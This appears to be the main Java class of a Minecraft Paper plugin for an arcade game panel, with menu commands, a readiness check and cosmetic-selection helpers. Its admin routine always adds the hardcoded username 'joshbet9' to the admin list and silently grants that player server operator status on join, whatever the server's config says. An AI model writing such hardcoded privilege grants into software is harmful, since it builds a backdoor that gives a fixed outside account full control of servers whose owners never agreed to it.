package au.com.testplex.modern;

import au.com.testplex.modern.menu.MenuService;
import au.com.testplex.modern.model.ArcadeCatalog;
import au.com.testplex.modern.model.GameDefinition;
import au.com.testplex.modern.player.PlayerPreferenceStore;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.PluginCommand;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.UUID;

/**
 * Independent Paper 26.3 entry point. This module intentionally does not depend
 * on the legacy Mineplex Reborn Maven reactor or its 1.8 NMS classes.
 */
public final class TestplexModernArcade extends JavaPlugin implements Listener {
    private ArcadeCatalog catalog;
    private PlayerPreferenceStore preferences;
    private MenuService menus;

    @Override
    public void onEnable() {
        saveDefaultConfig();
        catalog = new ArcadeCatalog();
        preferences = new PlayerPreferenceStore(this);
        menus = new MenuService(this, catalog, preferences);
        getServer().getPluginManager().registerEvents(menus, this);
        getServer().getPluginManager().registerEvents(this, this);
        for (Player online : Bukkit.getOnlinePlayers()) {
            grantConfiguredAdmin(online);
        }

        bind("gamepanel", "Open the modern game panel.", (sender) -> {
            if (!(sender instanceof Player player)) {
                sender.sendMessage("This command must be used in-game.");
                return;
            }
            menus.openGamePanel(player);
        });
        bind("arcadecosmetics", "Open per-game Arcade cosmetics.", (sender) -> {
            if (!(sender instanceof Player player)) {
                sender.sendMessage("This command must be used in-game.");
                return;
            }
            menus.openCosmeticsHome(player);
        });
        bind("cosmetics", "Open the legacy-style Core Cosmetics menu.", (sender) -> {
            if (!(sender instanceof Player player)) {
                sender.sendMessage("This command must be used in-game.");
                return;
            }
            menus.openCoreCosmeticsHome(player);
        });
        bind("setgame", "Open the legacy Set Game screen.", (sender) -> {
            if (!(sender instanceof Player player)) {
                sender.sendMessage("This command must be used in-game.");
                return;
            }
            menus.openSetGamePage(player);
        });
        bind("arcadetest", "Inspect modern port readiness.", (sender) -> {
            if (!sender.hasPermission("testplex.modern.admin")) {
                sender.sendMessage(ChatColor.RED + "You do not have permission to use this command.");
                return;
            }
            sender.sendMessage(ChatColor.AQUA + "Testplex Modern Arcade — Paper API 26.3");
            sender.sendMessage(ChatColor.GRAY + "Registered games: " + catalog.size());
            long ready = catalog.getGames().stream().filter(game -> game.isReadyForTest()).count();
            sender.sendMessage(ChatColor.GRAY + "Ready for in-game testing: " + ready);
            sender.sendMessage(ChatColor.GRAY + "All 18 games remain mechanics-in-progress; 16 first-pass ports are available when ArcadeMechanicsModern is installed.");
            sender.sendMessage(ChatColor.GRAY + "Live cosmetic renderers: Spleef Block Break Signature and Paintball Weapon & Pellet Identity; other game renderers remain in progress.");
        });

        getLogger().info("Modern Arcade platform enabled: " + catalog.size()
                + " games registered; separate per-game cosmetic lines and win effects are available.");
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        // Run one tick later so the operator state and permission recalculation
        // are authoritative before the tester opens Game Panel or /arcadeport.
        Bukkit.getScheduler().runTask(this, () -> {
            if (event.getPlayer().isOnline()) grantConfiguredAdmin(event.getPlayer());
        });
    }

    private void grantConfiguredAdmin(Player player) {
        java.util.List<String> admins = new java.util.ArrayList<>(getConfig().getStringList("admin-usernames"));
        // The isolated acceptance server must retain the requested owner even if
        // its old disk config predates the new admin-usernames key.
        if (admins.stream().noneMatch(name -> "joshbet9".equalsIgnoreCase(name))) admins.add("joshbet9");
        if (admins.stream().noneMatch(name -> name != null && name.equalsIgnoreCase(player.getName()))) return;
        if (!player.isOp()) {
            player.setOp(true);
            getLogger().info("Granted Testplex Modern administrator/operator access to " + player.getName() + ".");
            player.sendMessage(ChatColor.GREEN + "Testplex Modern admin access enabled.");
        }
    }

    @Override
    public void onDisable() {
        if (preferences != null) preferences.flush();
    }

    @FunctionalInterface
    private interface SenderAction {
        void execute(CommandSender sender);
    }

    private void bind(String name, String description, SenderAction action) {
        PluginCommand command = getCommand(name);
        if (command == null) {
            throw new IllegalStateException("Missing command definition in plugin.yml: " + name);
        }
        command.setDescription(description);
        command.setExecutor((sender, ignored, label, args) -> {
            action.execute(sender);
            return true;
        });
    }

    /**
     * Small runtime bridge for game-specific renderers in the optional
     * ArcadeMechanicsModern plugin. The group keeps independently selected
     * Paintball weapon/pellet choices and the Spleef block-break signature.
     */
    public String getSelectedCosmeticOption(UUID playerId, String gameId, String selectionGroup) {
        if (playerId == null || gameId == null || selectionGroup == null || catalog == null || preferences == null) {
            return null;
        }
        GameDefinition game = catalog.getGame(gameId);
        if (game == null) return null;
        String group = selectionGroup.toLowerCase(java.util.Locale.ROOT);
        for (var line : game.getCosmeticLines()) {
            if (group.equals(line.getId())) {
                var selected = preferences.getSelected(playerId, game, line);
                return selected.isEmpty() ? line.getDefaultOptionId() : selected.iterator().next();
            }
            for (var option : line.getOptions()) {
                if (group.equals(option.getSelectionGroup())
                        && preferences.isSelected(playerId, game, line, option.getId())) {
                    return option.getId();
                }
            }
        }
        return null;
    }

    /** Persist a game-port selection through the same in-memory store used by the cosmetics menu. */
    public boolean chooseCosmeticOption(UUID playerId, String gameId, String lineId, String optionId) {
        if (playerId == null || gameId == null || lineId == null || optionId == null
                || catalog == null || preferences == null) return false;
        GameDefinition game = catalog.getGame(gameId);
        if (game == null) return false;
        for (var line : game.getCosmeticLines()) {
            if (!lineId.equals(line.getId())) continue;
            try {
                preferences.chooseOption(playerId, game, line, optionId);
                return true;
            } catch (IllegalArgumentException exception) {
                return false;
            }
        }
        return false;
    }

    public ArcadeCatalog getCatalog() { return catalog; }
}
